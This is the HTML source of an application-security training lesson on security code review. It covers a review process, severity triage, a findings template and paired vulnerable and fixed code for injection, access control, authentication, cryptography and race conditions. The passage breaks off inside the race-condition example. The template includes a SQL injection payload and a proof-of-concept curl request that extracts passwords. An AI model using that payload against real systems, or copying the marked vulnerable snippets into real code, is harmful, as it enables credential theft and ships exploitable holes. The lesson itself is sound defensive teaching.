@@ -1,0 +1,819 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>AppSec Engineer — Lesson 19: Code Review</title>
+<link href="https://fonts.googleapis.com/css2?family=DM+Mono:ital,wght@0,300;0,400;0,500;1,400&family=JetBrains+Mono:wght@400;500;600;700&family=DM+Serif+Text:ital@0;1&display=swap" rel="stylesheet">
+<style>
+:root{
+  --bg:#08090c;--surface:#0e0f14;--surface2:#13141b;--surface3:#181922;
+  --border:#1c1e28;--border2:#252838;--ink:#dde0f0;--ink2:#7880a8;--ink3:#303550;
+  --accent:#7c9cf8;--accent-bg:rgba(124,156,248,0.08);
+  --red:#e06060;--red-bg:rgba(224,96,96,0.08);
+  --orange:#e09040;--orange-bg:rgba(224,144,64,0.08);
+  --yellow:#c8a830;--yellow-bg:rgba(200,168,48,0.08);
+  --green:#48b878;--green-bg:rgba(72,184,120,0.08);
+  --purple:#a878e8;--purple-bg:rgba(168,120,232,0.08);
+  --teal:#38c8b8;--teal-bg:rgba(56,200,184,0.08);
+  --pink:#e860a8;--pink-bg:rgba(232,96,168,0.08);
+  --code-bg:#040508;
+}
+*{margin:0;padding:0;box-sizing:border-box;}
+html{scroll-behavior:smooth;}
+body{background:var(--bg);color:var(--ink);font-family:'DM Mono',monospace;font-size:14px;line-height:1.85;}
+.sidebar{position:fixed;left:0;top:0;bottom:0;width:252px;background:var(--surface);border-right:1px solid var(--border);overflow-y:auto;z-index:100;}
+.sb-brand{padding:1.4rem 1.2rem 1rem;border-bottom:1px solid var(--border);}
+.sb-badge{font-family:'JetBrains Mono',monospace;font-size:9px;background:var(--accent);color:#000;padding:2px 8px;border-radius:2px;letter-spacing:.12em;display:inline-block;margin-bottom:7px;text-transform:uppercase;font-weight:700;}
+.sb-brand h2{font-size:12px;font-weight:400;color:var(--ink3);line-height:1.4;}
+.sb-sect{padding:.7rem 1.2rem .2rem;font-size:9px;font-weight:500;letter-spacing:.15em;text-transform:uppercase;color:var(--ink3);margin-top:.25rem;opacity:.55;}
+.nav-item{display:flex;align-items:center;gap:9px;padding:.38rem 1.2rem;cursor:pointer;border-left:2px solid transparent;font-size:11.5px;color:var(--ink3);text-decoration:none;transition:all .15s;}
+.nav-item:hover{color:var(--ink2);background:var(--surface2);}
+.nav-item.done{color:var(--ink3);}
+.nav-item.active{color:var(--accent);border-left-color:var(--accent);background:var(--accent-bg);}
+.nav-item .num{font-size:10px;min-width:22px;opacity:.3;}
+.nav-item.active .num{opacity:1;color:var(--accent);}
+.main{margin-left:252px;}
+.topbar{position:sticky;top:0;background:rgba(8,9,12,.96);backdrop-filter:blur(14px);border-bottom:1px solid var(--border);padding:.65rem 2.5rem;display:flex;align-items:center;justify-content:space-between;z-index:50;}
+.bc{font-size:11px;color:var(--ink3);}
+.bc span{color:var(--accent);}
+.top-badge{font-size:10px;padding:3px 10px;background:var(--surface2);border:1px solid var(--border);color:var(--ink2);border-radius:2px;}
+.content{padding:3rem 2.5rem 5rem;max-width:960px;}
+.hero{margin-bottom:3.5rem;padding-bottom:2.5rem;border-bottom:1px solid var(--border);}
+.hero-meta{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:1rem;}
+.tag{font-size:10px;padding:3px 10px;border-radius:2px;font-weight:500;letter-spacing:.04em;}
+.t-beg{background:var(--green-bg);color:var(--green);border:1px solid rgba(72,184,120,.2);}
+.t-frm{background:var(--accent-bg);color:var(--accent);border:1px solid rgba(124,156,248,.2);}
+.t-time{background:var(--purple-bg);color:var(--purple);border:1px solid rgba(168,120,232,.2);}
+.hero h1{font-family:'DM Serif Text',serif;font-size:3.2rem;line-height:1.1;color:var(--ink);margin-bottom:.85rem;}
+.hero h1 .hl{color:var(--accent);}
+.hero-sub{font-size:13.5px;color:var(--ink2);max-width:660px;line-height:1.8;margin-bottom:1.75rem;}
+.level-strip{display:grid;grid-template-columns:repeat(3,1fr);gap:1px;background:var(--border);border:1px solid var(--border);border-radius:6px;overflow:hidden;}
+.lv-cell{background:var(--surface);padding:.9rem 1rem;}
+.lv-pip{width:8px;height:8px;border-radius:50%;margin-bottom:7px;}
+.lv-label{font-size:9px;letter-spacing:.12em;text-transform:uppercase;color:var(--ink3);margin-bottom:3px;}
+.lv-title{font-size:13px;font-weight:500;color:var(--ink);margin-bottom:2px;}
+.lv-desc{font-size:12px;color:var(--ink3);line-height:1.5;}
+.section{margin-bottom:3.5rem;}
+.eyebrow{font-size:10px;text-transform:uppercase;letter-spacing:.15em;color:var(--accent);margin-bottom:5px;font-weight:500;}
+.sec-title{font-family:'DM Serif Text',serif;font-size:1.85rem;color:var(--ink);line-height:1.2;margin-bottom:.35rem;}
+.sec-sub{font-size:13px;color:var(--ink2);max-width:660px;line-height:1.75;margin-bottom:1.5rem;}
+.callout{border-radius:5px;padding:.9rem 1.1rem;margin:1rem 0;display:flex;gap:10px;align-items:flex-start;border-left:3px solid;}
+.cl-warn{background:var(--red-bg);border-color:var(--red);}
+.cl-info{background:var(--accent-bg);border-color:var(--accent);}
+.cl-tip{background:var(--green-bg);border-color:var(--green);}
+.cl-note{background:var(--yellow-bg);border-color:var(--yellow);}
+.cl-purple{background:var(--purple-bg);border-color:var(--purple);}
+.cl-teal{background:var(--teal-bg);border-color:var(--teal);}
+.cl-icon{font-size:15px;flex-shrink:0;margin-top:2px;}
+.cl-text{font-size:13px;color:var(--ink2);line-height:1.7;}
+.cl-text strong{color:var(--ink);}
+.cl-text code{font-size:11.5px;background:rgba(255,255,255,.06);padding:1px 5px;border-radius:3px;color:var(--accent);}
+pre{background:var(--code-bg);color:#ccd0e8;border-radius:6px;padding:1.25rem;font-size:12px;line-height:1.8;overflow-x:auto;margin:.85rem 0;position:relative;border:1px solid var(--border);}
+.ctag{position:absolute;top:10px;right:12px;font-size:9px;color:var(--ink3);text-transform:uppercase;letter-spacing:.1em;}
+.ck{color:#c084fc;}.cf{color:#7dd3fc;}.cs{color:#86efac;}.cm{color:#2a3050;}.cv{color:#fcd34d;}.ce{color:#fb923c;}.cr{color:#f87171;}.cg{color:#4ade80;}.ct{color:#2dd4bf;}.cw{color:#f9a8d4;}
+.lb{display:block;background:rgba(224,96,96,.09);border-left:2px solid #ef4444;margin:0 -1.25rem;padding:0 1.25rem;}
+.lg{display:block;background:rgba(72,184,120,.07);border-left:2px solid #22c55e;margin:0 -1.25rem;padding:0 1.25rem;}
+.lw{display:block;background:rgba(200,168,48,.07);border-left:2px solid #f59e0b;margin:0 -1.25rem;padding:0 1.25rem;}
+table{width:100%;border-collapse:collapse;font-size:12.5px;margin:1rem 0;}
+th{padding:.55rem .9rem;text-align:left;background:var(--surface2);border:1px solid var(--border);font-size:9px;text-transform:uppercase;letter-spacing:.08em;color:var(--ink3);}
+td{padding:.55rem .9rem;border:1px solid var(--border);color:var(--ink2);line-height:1.5;vertical-align:top;}
+tr:hover td{background:var(--surface2);}
+.panel{background:var(--surface);border:1px solid var(--border);border-radius:6px;overflow:hidden;margin-bottom:.75rem;}
+.panel-h{display:flex;align-items:center;gap:10px;padding:.9rem 1.1rem;cursor:pointer;transition:background .15s;user-select:none;}
+.panel-h:hover{background:var(--surface2);}
+.panel-dot{width:10px;height:10px;border-radius:50%;flex-shrink:0;}
+.panel-title{font-size:13px;font-weight:500;flex:1;color:var(--ink);}
+.panel-sub{font-size:11.5px;color:var(--ink3);}
+.panel-tog{color:var(--ink3);font-size:13px;transition:transform .2s;}
+.panel.open .panel-tog{transform:rotate(180deg);}
+.panel-body{display:none;padding:0 1.1rem 1.1rem;border-top:1px solid var(--border);}
+.panel.open .panel-body{display:block;}
+.panel-body h4{font-size:10px;text-transform:uppercase;letter-spacing:.1em;color:var(--ink3);margin:1rem 0 .5rem;font-weight:500;}
+.panel-body p{font-size:13px;color:var(--ink2);line-height:1.75;margin-top:.6rem;}
+.vuln-grid{display:grid;grid-template-columns:1fr 1fr;gap:.75rem;margin:1rem 0;}
+.vcard{background:var(--surface);border:1px solid var(--border);border-top:3px solid;border-radius:6px;padding:1rem;cursor:pointer;transition:background .15s;}
+.vcard:hover{background:var(--surface2);}
+.vc-red{border-top-color:var(--red);}
+.vc-orange{border-top-color:var(--orange);}
+.vc-blue{border-top-color:var(--accent);}
+.vc-purple{border-top-color:var(--purple);}
+.vc-teal{border-top-color:var(--teal);}
+.vc-pink{border-top-color:var(--pink);}
+.vcard-title{font-size:12.5px;font-weight:500;color:var(--ink);margin-bottom:.3rem;}
+.vcard-meta{font-size:11px;color:var(--ink3);margin-bottom:.6rem;}
+.vcard-body{display:none;margin-top:.75rem;padding-top:.75rem;border-top:1px solid var(--border);}
+.vcard-body.show{display:block;}
+.vcard-body h5{font-size:9px;text-transform:uppercase;letter-spacing:.1em;color:var(--ink3);margin:.6rem 0 .3rem;font-weight:500;}
+.vcard-body p{font-size:12.5px;color:var(--ink2);line-height:1.7;}
+.pill{font-size:11px;padding:3px 9px;border-radius:2px;font-weight:500;}
+.pr{background:var(--red-bg);color:var(--red);border:1px solid rgba(224,96,96,.2);}
+.pg{background:var(--green-bg);color:var(--green);border:1px solid rgba(72,184,120,.2);}
+.py{background:var(--yellow-bg);color:var(--yellow);border:1px solid rgba(200,168,48,.2);}
+.pb{background:var(--accent-bg);color:var(--accent);border:1px solid rgba(124,156,248,.2);}
+.pp{background:var(--purple-bg);color:var(--purple);border:1px solid rgba(168,120,232,.2);}
+.pt{background:var(--teal-bg);color:var(--teal);border:1px solid rgba(56,200,184,.2);}
+.pill-row{display:flex;flex-wrap:wrap;gap:6px;margin:.5rem 0;}
+.quiz-block{background:var(--surface);border:1px solid var(--border);border-radius:6px;padding:1.25rem;margin-bottom:1rem;}
+.quiz-q{font-size:13.5px;font-weight:500;color:var(--ink);margin-bottom:.85rem;line-height:1.55;}
+.quiz-opts{display:flex;flex-direction:column;gap:7px;}
+.qo{padding:.65rem 1rem;border:1px solid var(--border);border-radius:4px;cursor:pointer;font-size:13px;color:var(--ink2);background:var(--surface2);transition:all .15s;}
+.qo:hover{border-color:var(--accent);color:var(--ink);}
+.qo.correct{border-color:var(--green);color:var(--green);background:var(--green-bg);cursor:default;}
+.qo.wrong{border-color:var(--red);color:var(--red);background:var(--red-bg);cursor:default;}
+.quiz-exp{font-size:12.5px;color:var(--ink2);line-height:1.7;padding:.75rem 1rem;background:var(--surface2);border-radius:4px;border-left:3px solid var(--green);display:none;margin-top:.5rem;}
+.quiz-exp.show{display:block;}
+.challenge{background:var(--surface);border:1px solid var(--accent);border-radius:10px;padding:2rem;margin:3rem 0;position:relative;overflow:hidden;}
+.challenge::before{content:'';position:absolute;top:-60px;right:-60px;width:220px;height:220px;background:radial-gradient(circle,var(--accent-bg) 0%,transparent 70%);pointer-events:none;}
+.ch-ey{font-size:9px;text-transform:uppercase;letter-spacing:.15em;color:var(--accent);margin-bottom:.5rem;}
+.ch h3{font-family:'DM Serif Text',serif;font-size:1.5rem;color:var(--ink);margin-bottom:.7rem;}
+.ch-desc{font-size:13px;color:var(--ink2);line-height:1.75;margin-bottom:1.25rem;}
+.scenario{background:var(--surface2);border:1px solid var(--border);border-radius:5px;padding:1rem 1.1rem;margin-bottom:1.25rem;}
+.scenario p{font-size:12.5px;color:var(--ink2);line-height:1.75;}
+.scenario strong{color:var(--ink);}
+.challenge textarea{width:100%;min-height:200px;background:var(--code-bg);border:1px solid var(--border);border-radius:4px;padding:1rem;font-family:'JetBrains Mono',monospace;font-size:12px;color:var(--ink);resize:vertical;outline:none;transition:border-color .2s;margin-bottom:1rem;}
+.challenge textarea:focus{border-color:var(--accent);}
+.challenge textarea::placeholder{color:var(--ink3);}
+.btn-row{display:flex;gap:10px;flex-wrap:wrap;}
+.btn{padding:9px 20px;border-radius:4px;font-size:13px;font-family:'DM Mono',monospace;font-weight:500;cursor:pointer;border:1px solid;transition:all .15s;}
+.btn-p{background:var(--accent);color:#000;border-color:var(--accent);}
+.btn-p:hover{background:#6080e0;}
+.btn-g{background:transparent;color:var(--ink2);border-color:var(--border2);}
+.btn-g:hover{border-color:var(--accent);color:var(--ink);}
+.ch-fb{margin-top:1rem;padding:1rem 1.1rem;border-radius:5px;font-size:13px;line-height:1.7;display:none;}
+.ch-fb.show{display:block;}
+.ch-fb.good{background:var(--green-bg);border:1px solid rgba(72,184,120,.25);color:var(--green);}
+.ch-fb.hint{background:var(--yellow-bg);border:1px solid rgba(200,168,48,.25);color:var(--yellow);}
+.ch-fb.reveal{background:var(--surface2);border:1px solid var(--border);color:var(--ink2);}
+.nav-footer{display:flex;justify-content:space-between;margin-top:4rem;padding-top:2rem;border-top:1px solid var(--border);}
+.nf-btn{padding:.85rem 1.5rem;border:1px solid var(--border);border-radius:4px;font-size:13px;cursor:pointer;background:var(--surface);color:var(--ink2);text-align:left;transition:all .15s;text-decoration:none;display:block;}
+.nf-btn:hover{border-color:var(--accent);}
+.nf-btn.next{background:var(--accent);color:#000;border-color:var(--accent);text-align:right;}
+.nf-btn.next:hover{background:#6080e0;}
+.nf-dir{font-size:9px;text-transform:uppercase;letter-spacing:.1em;color:var(--ink3);display:block;margin-bottom:3px;}
+.nf-btn.next .nf-dir{color:rgba(0,0,0,.4);}
+.nf-title{font-weight:500;display:block;}
+code{font-size:12px;background:rgba(255,255,255,.06);padding:1px 5px;border-radius:3px;color:var(--accent);}
+pre code{background:none;padding:0;color:inherit;font-size:inherit;}
+::-webkit-scrollbar{width:5px;height:5px;}
+::-webkit-scrollbar-track{background:var(--bg);}
+::-webkit-scrollbar-thumb{background:var(--border);border-radius:3px;}
+@media(max-width:860px){.sidebar{display:none;}.main{margin-left:0;}.content{padding:1.5rem 1.1rem 3rem;}.level-strip,.vuln-grid{grid-template-columns:1fr;}}
+</style>
+</head>
+<body>
+<nav class="sidebar">
+  <div class="sb-brand"><div class="sb-badge">AppSec Engineer</div><h2>Application Security<br>Learning Path</h2></div>
+  <div class="sb-sect">Module 1 &mdash; Foundations</div>
+  <a class="nav-item done" href="#"><span class="num">01</span>OWASP Top 10 2021</a>
+  <a class="nav-item done" href="#"><span class="num">02</span>Secure SDLC</a>
+  <a class="nav-item done" href="#"><span class="num">03</span>Threat Modeling</a>
+  <div class="sb-sect">Module 2 &mdash; Testing Tools</div>
+  <a class="nav-item done" href="#"><span class="num">04</span>SAST</a>
+  <a class="nav-item done" href="#"><span class="num">05</span>DAST</a>
+  <a class="nav-item done" href="#"><span class="num">06</span>SCA</a>
+  <a class="nav-item done" href="#"><span class="num">07</span>IAST &amp; RASP</a>
+  <div class="sb-sect">Module 3 &mdash; API Security</div>
+  <a class="nav-item done" href="#"><span class="num">08</span>OWASP API Top 10</a>
+  <a class="nav-item done" href="#"><span class="num">09</span>API Security Testing</a>
+  <a class="nav-item done" href="#"><span class="num">10</span>GraphQL Security</a>
+  <div class="sb-sect">Module 4 &mdash; DevSecOps</div>
+  <a class="nav-item done" href="#"><span class="num">11</span>DevSecOps Pipeline</a>
+  <a class="nav-item done" href="#"><span class="num">12</span>Secrets Management</a>
+  <a class="nav-item done" href="#"><span class="num">13</span>Container Security</a>
+  <a class="nav-item done" href="#"><span class="num">14</span>Dependency Scanning</a>
+  <a class="nav-item done" href="#"><span class="num">15</span>SBOM</a>
+  <div class="sb-sect">Module 5 &mdash; Architecture</div>
+  <a class="nav-item done" href="#"><span class="num">16</span>Security Architecture</a>
+  <a class="nav-item done" href="#"><span class="num">17</span>Supply Chain Security</a>
+  <a class="nav-item done" href="#"><span class="num">18</span>WAF</a>
+  <a class="nav-item active" href="#"><span class="num">19</span>Code Review</a>
+  <a class="nav-item" href="#"><span class="num">20</span>RASP</a>
+</nav>
+
+<div class="main">
+<div class="topbar">
+  <div class="bc">appsec-engineer / module-5 / <span>code-review</span></div>
+  <div class="top-badge">Lesson 19 / 20</div>
+</div>
+<div class="content">
+
+<div class="hero">
+  <div class="hero-meta">
+    <span class="tag t-beg">Beginner &rarr; Advanced</span>
+    <span class="tag t-frm">Testing</span>
+    <span class="tag t-time">~65 min</span>
+  </div>
+  <h1>Security<br><span class="hl">Code Review</span></h1>
+  <p class="hero-sub">Security code review is the systematic examination of source code to find vulnerabilities that automated tools miss: business logic flaws, authentication bypasses, second-order injection, insecure data flows, and subtle race conditions. A good security reviewer thinks like an attacker while reading code. This lesson gives you a systematic process, a vulnerability taxonomy for code review, the specific patterns to look for in each category, and a triage model for communicating findings effectively.</p>
+  <div class="level-strip">
+    <div class="lv-cell"><div class="lv-pip" style="background:var(--green)"></div><div class="lv-label">Beginner</div><div class="lv-title">Process &amp; mindset</div><div class="lv-desc">Security review vs quality review, threat modelling the code, entry points and trust boundaries, triage levels</div></div>
+    <div class="lv-cell"><div class="lv-pip" style="background:var(--yellow)"></div><div class="lv-label">Intermediate</div><div class="lv-title">Vulnerability patterns</div><div class="lv-desc">Injection, auth flaws, broken access control, cryptography mistakes, insecure deserialization, race conditions</div></div>
+    <div class="lv-cell"><div class="lv-pip" style="background:var(--red)"></div><div class="lv-label">Advanced</div><div class="lv-title">Efficient review at scale</div><div class="lv-desc">Automated + manual combination, custom SAST rules, PR review checklists, developer education, writing clear findings</div></div>
+  </div>
+</div>
+
+<!-- BEGINNER: PROCESS -->
+<div class="section">
+  <div class="eyebrow">&#x1F7E2; Beginner &mdash; Process &amp; Mindset</div>
+  <div class="sec-title">How to approach a security code review</div>
+  <div class="sec-sub">Security code review is not the same as quality code review. The goal is not to find bugs or style issues &mdash; it is to find paths through which an attacker can cause harm. That requires a different mental model.</div>
+
+  <div class="panel" id="pan-process">
+    <div class="panel-h" onclick="tp('pan-process')">
+      <div class="panel-dot" style="background:var(--accent)"></div>
+      <div class="panel-title">The security review process &mdash; 5 phases</div>
+      <div class="panel-sub">From scope to findings: a repeatable approach</div>
+      <div class="panel-tog">&#x25BC;</div>
+    </div>
+    <div class="panel-body">
+      <table>
+        <tr><th>Phase</th><th>What you do</th><th>Output</th></tr>
+        <tr><td style="font-weight:500;color:var(--accent)">1. Context</td><td>Understand what the code does, what data it handles, who the users are, and what the trust model is. Read the spec, not just the code.</td><td>Threat actor list, data sensitivity classification, trust boundary diagram</td></tr>
+        <tr><td style="font-weight:500;color:var(--accent)">2. Entry points</td><td>Identify every way untrusted data enters the system: HTTP parameters, headers, cookies, file uploads, message queues, webhooks, database values read back, environment variables.</td><td>Data flow map: untrusted data sources &rarr; sinks</td></tr>
+        <tr><td style="font-weight:500;color:var(--accent)">3. Systematic scan</td><td>For each vulnerability category relevant to this code: look for the pattern. Use the checklist. Don't just read sequentially — hunt specific patterns.</td><td>Raw findings list with file/line references</td></tr>
+        <tr><td style="font-weight:500;color:var(--accent)">4. Verify exploitability</td><td>For each candidate finding: can this actually be exploited? What is the attack chain? Is there a compensating control elsewhere that would prevent it?</td><td>Verified findings with PoC or explanation</td></tr>
+        <tr><td style="font-weight:500;color:var(--accent)">5. Report</td><td>Write findings in developer-actionable format: what is the vulnerability, where is it, what is the attack scenario, and what specifically should be changed.</td><td>Findings report with severity, location, and specific remediation</td></tr>
+      </table>
+      <h4>The attacker's question</h4>
+      <p>For every piece of code, ask: <em>"What happens if an attacker controls this value?"</em> Trace the value from its source (HTTP parameter, database read, external API response) through every transformation and decision point to its final use (SQL query, filesystem operation, HTML output, command execution). If the attacker controls the final use without adequate validation, that is a finding.</p>
+    </div>
+  </div>
+
+  <div class="panel" id="pan-triage">
+    <div class="panel-h" onclick="tp('pan-triage')">
+      <div class="panel-dot" style="background:var(--red)"></div>
+      <div class="panel-title">Severity triage &mdash; rating and communicating findings</div>
+      <div class="panel-sub">How to rate severity and write findings that developers act on</div>
+      <div class="panel-tog">&#x25BC;</div>
+    </div>
+    <div class="panel-body">
+      <table>
+        <tr><th>Severity</th><th>Definition</th><th>Example</th><th>Expected response</th></tr>
+        <tr><td style="font-weight:700;color:var(--red)">Critical</td><td>Direct path to full compromise: RCE, auth bypass, unauthenticated data exfiltration, privilege escalation to admin</td><td>SQL injection in login returning session token; JWT algorithm confusion allowing any token to be forged</td><td>Fix before deployment; block PR merge</td></tr>
+        <tr><td style="font-weight:700;color:var(--orange)">High</td><td>Significant security impact but requires some conditions: authenticated SQLi, stored XSS in admin panel, BOLA on sensitive data</td><td>Authenticated user can read other users' PII by changing an ID</td><td>Fix before release; 7-day SLA</td></tr>
+        <tr><td style="font-weight:700;color:var(--yellow)">Medium</td><td>Security weakness with limited direct impact: CSRF on non-sensitive endpoints, information disclosure without sensitive data, missing rate limiting</td><td>Missing CSRF protection on profile update (no sensitive data)</td><td>Fix in next sprint; 30-day SLA</td></tr>
+        <tr><td style="font-weight:700;color:var(--green)">Low</td><td>Best practice violation with minimal security impact: verbose error messages, missing security header, overly broad CORS for public endpoints</td><td>Stack trace returned in error response in development mode left enabled</td><td>Track and fix; next regular release</td></tr>
+        <tr><td style="font-weight:700;color:var(--accent)">Informational</td><td>Observation or recommendation with no direct security impact: design suggestion, documentation issue, style concern</td><td>Consider adding input validation even though this endpoint is admin-only</td><td>Optional; document for future refactoring</td></tr>
+      </table>
+      <h4>Writing an actionable finding</h4>
+<pre>
+<span class="ctag">finding template</span>
+<span class="cm">## Finding: SQL Injection in Product Search
+Severity: CRITICAL
+File: app/views/products.py, line 42
+CWE: CWE-89 (SQL Injection)
+
+### Vulnerability
+The `keyword` parameter from the HTTP request is directly interpolated
+into a SQL query without sanitization or parameterization.
+
+### Vulnerable code
+</span><span class="cr">query = f"SELECT * FROM products WHERE name LIKE '%{keyword}%'"
+db.execute(query)</span>
+
+<span class="cm">### Attack scenario
+An attacker sends: GET /api/products?keyword=' UNION SELECT password FROM users--
+The server executes: SELECT * FROM products WHERE name LIKE '%' UNION SELECT...
+Result: all user passwords returned in the product listing.
+
+### Proof of concept
+curl "https://api.example.com/products?keyword=%27%20UNION%20SELECT%20password%20FROM%20users--"
+
+### Fix
+Use parameterized queries:</span>
+<span class="cg">query = "SELECT * FROM products WHERE name LIKE %s"
+db.execute(query, (f"%{keyword}%",))</span>
+<span class="cm">### References
+OWASP SQL Injection: https://owasp.org/www-community/attacks/SQL_Injection</span>
+</pre>
+    </div>
+  </div>
+</div>
+
+<!-- INTERMEDIATE: VULNERABILITY PATTERNS -->
+<div class="section">
+  <div class="eyebrow">&#x1F7E1; Intermediate &mdash; Vulnerability Patterns to Look For</div>
+  <div class="sec-title">What to hunt in a security code review</div>
+  <div class="sec-sub">Each card below covers a vulnerability class: the code pattern to look for, a real example with vulnerable and fixed code, and what SAST misses that human review catches. Click to expand.</div>
+
+  <div class="vuln-grid">
+
+    <div class="vcard vc-red" id="vc1" onclick="toggleVC('vc1')">
+      <div class="vcard-title">Injection &amp; Data Flow</div>
+      <div class="vcard-meta">SQLi, CMDi, Path Traversal, XXE &bull; CWE-89, CWE-78</div>
+      <div class="vcard-body" id="vc1-b">
+        <h5>Pattern to hunt</h5>
+        <p>Trace untrusted input from its source (request params, headers, file content) to any function that executes it (db.execute, subprocess.run, os.system, open(), lxml.etree.parse). Look for string concatenation or f-strings at the call site.</p>
+<pre>
+<span class="cm"># SQLi: f-string in query</span>
+<span class="lb">q = f"SELECT * FROM users WHERE name='{name}'"</span>
+<span class="lg">q = "SELECT * FROM users WHERE name=%s" ; db.execute(q,(name,))</span>
+
+<span class="cm"># Path traversal: unsanitised file open</span>
+<span class="lb">open(f"/var/data/{filename}")</span>
+<span class="lg">safe = os.path.basename(filename)</span>
+<span class="lg">open(os.path.join("/var/data", safe))</span>
+
+<span class="cm"># Command injection via subprocess</span>
+<span class="lb">subprocess.run(f"convert {user_file} output.png", shell=True)</span>
+<span class="lg">subprocess.run(["convert", user_file, "output.png"])</span>
+
+<span class="cm"># What SAST misses: second-order injection
+# Value stored to DB here (looks clean to SAST)</span>
+<span class="lb">db.execute("INSERT INTO prefs VALUES (%s)", (username,))</span>
+<span class="cm"># ...then read back later and used unsafely (SAST doesn't track this)</span>
+<span class="lb">name = db.get("SELECT name FROM prefs WHERE id=%s", (id,))</span>
+<span class="lb">os.system(f"notify {name}")   <span class="cm"># CMDi via stored value</span></span>
+</pre>
+      </div>
+    </div>
+
+    <div class="vcard vc-orange" id="vc2" onclick="toggleVC('vc2')">
+      <div class="vcard-title">Broken Access Control &amp; BOLA</div>
+      <div class="vcard-meta">OWASP A01 &bull; CWE-284, CWE-639</div>
+      <div class="vcard-body" id="vc2-b">
+        <h5>Pattern to hunt</h5>
+        <p>Look for any database query or object lookup that uses a user-supplied ID without also checking ownership. The check at the endpoint level is not enough — verify the ownership check is on every path that returns sensitive data.</p>
+<pre>
+<span class="cm"># BOLA: lookup by ID with no ownership check</span>
+<span class="lb">order = Order.objects.get(id=order_id)   <span class="cm"># any user can get any order</span></span>
+<span class="lg">order = Order.objects.get(id=order_id, user=request.user)</span>
+
+<span class="cm"># Privilege escalation: role check only on some paths</span>
+<span class="lb">if request.method == 'GET':
+    return User.objects.get(id=user_id)  <span class="cm"># no role check on reads!</span></span>
+<span class="lb">if request.method == 'POST':
+    if not request.user.is_staff: raise PermissionDenied</span>
+
+<span class="cm"># Function level: admin feature accessible by all users</span>
+<span class="lb">def export_all_users(request):           <span class="cm"># no @login_required or role check</span></span>
+<span class="lb">    return User.objects.all().values()</span>
+
+<span class="cm"># What SAST misses: BOLA requires understanding the data model
+# SAST cannot tell if Order.objects.get(id=x) should filter by user
+# That requires understanding the business logic</span>
+</pre>
+      </div>
+    </div>
+
+    <div class="vcard vc-blue" id="vc3" onclick="toggleVC('vc3')">
+      <div class="vcard-title">Authentication &amp; Session Flaws</div>
+      <div class="vcard-meta">JWT issues, password storage, session fixation &bull; CWE-287</div>
+      <div class="vcard-body" id="vc3-b">
+        <h5>Pattern to hunt</h5>
+        <p>JWT: check algorithm enforcement and key confusion. Passwords: check hash algorithm (bcrypt/argon2 vs md5/sha1). Sessions: check fixation, timeout, and revocation on logout. Token storage: localStorage (bad) vs httpOnly cookie (good).</p>
+<pre>
+<span class="cm"># JWT: algorithm: none attack &mdash; never accept 'none'</span>
+<span class="lb">payload = jwt.decode(token, SECRET, algorithms=["HS256", "none"])</span>
+<span class="lg">payload = jwt.decode(token, SECRET, algorithms=["HS256"])</span>
+
+<span class="cm"># JWT: no audience check &mdash; token for service A works on service B</span>
+<span class="lb">payload = jwt.decode(token, PUB_KEY, algorithms=["RS256"])</span>
+<span class="lg">payload = jwt.decode(token, PUB_KEY, algorithms=["RS256"],
+                     audience="https://api.myapp.com")</span>
+
+<span class="cm"># Weak password hash</span>
+<span class="lb">hashed = hashlib.md5(password.encode()).hexdigest()</span>
+<span class="lg">hashed = bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=12))</span>
+
+<span class="cm"># Password comparison: timing attack vulnerability</span>
+<span class="lb">if stored_hash == input_hash:           <span class="cm"># early exit reveals hash length</span></span>
+<span class="lg">if hmac.compare_digest(stored_hash, input_hash):  <span class="cm"># constant time</span></span>
+
+<span class="cm"># Session fixation: must regenerate session ID on login</span>
+<span class="lb">request.session['user_id'] = user.id    <span class="cm"># old session ID reused</span></span>
+<span class="lg">request.session.cycle_key()             <span class="cm"># new session ID, copy data</span></span>
+<span class="lg">request.session['user_id'] = user.id</span>
+</pre>
+      </div>
+    </div>
+
+    <div class="vcard vc-purple" id="vc4" onclick="toggleVC('vc4')">
+      <div class="vcard-title">Cryptography Mistakes</div>
+      <div class="vcard-meta">Weak algorithms, IV reuse, CBC padding oracle &bull; CWE-327, CWE-330</div>
+      <div class="vcard-body" id="vc4-b">
+        <h5>Pattern to hunt</h5>
+        <p>Look for: MD5/SHA1 for security (use SHA-256+). DES/3DES/RC4/ECB mode (use AES-256-GCM). Hardcoded IV or nonce reuse. Random number generated with <code>random</code> not <code>secrets</code> module. PRNG seeds that are predictable.</p>
+<pre>
+<span class="cm"># Weak hash for security purpose</span>
+<span class="lb">token = hashlib.md5(user_id + timestamp).hexdigest()</span>
+<span class="lg">token = secrets.token_hex(32)           <span class="cm"># cryptographically random</span></span>
+
+<span class="cm"># ECB mode: blocks encrypted independently, patterns visible</span>
+<span class="lb">cipher = AES.new(key, AES.MODE_ECB)</span>
+<span class="lg">cipher = AES.new(key, AES.MODE_GCM)    <span class="cm"># authenticated encryption</span></span>
+
+<span class="cm"># IV reuse: same IV with same key = catastrophic</span>
+<span class="lb">IV = b'\x00' * 16                       <span class="cm"># constant IV</span></span>
+<span class="lg">IV = secrets.token_bytes(16)            <span class="cm"># random IV per message</span></span>
+
+<span class="cm"># Non-cryptographic random for security token</span>
+<span class="lb">import random
+token = str(random.randint(100000, 999999))  <span class="cm"># predictable with seed</span></span>
+<span class="lg">import secrets
+token = secrets.token_urlsafe(32)            <span class="cm"># CSPRNG</span></span>
+
+<span class="cm"># Insecure key derivation</span>
+<span class="lb">key = hashlib.sha256(password.encode()).digest()   <span class="cm"># no salt, no iterations</span></span>
+<span class="lg">key = hashlib.pbkdf2_hmac('sha256', password.encode(), salt, 600000)</span>
+</pre>
+      </div>
+    </div>
+
+    <div class="vcard vc-teal" id="vc5" onclick="toggleVC('vc5')">
+      <div class="vcard-title">Business Logic &amp; Race Conditions</div>
+      <div class="vcard-meta">Time-of-check vs time-of-use, double-spend, state machine violations</div>
+      <div class="vcard-body" id="vc5-b">
+        <h5>Pattern to hunt</h5>
+        <p>These are the vulnerabilities SAST almost never finds. They require understanding the business intent. Look for: read-then-write sequences that should be atomic. State transitions that skip steps. Limits checked before rather than during a transaction. Parallel request exploitation paths.</p>
+<pre>
+<span class="cm"># TOCTOU race: balance checked then deducted separately</span>
+<span class="lb">balance = get_balance(user_id)          <span class="cm"># read</span></span>
+<span class="lb">if balance >= amount:                   <span class="cm"># check</span></span>
+<span class="lb">    deduct(user_id, amount)             <span class="cm"># two concurrent requests both pass the check</span></span>
+
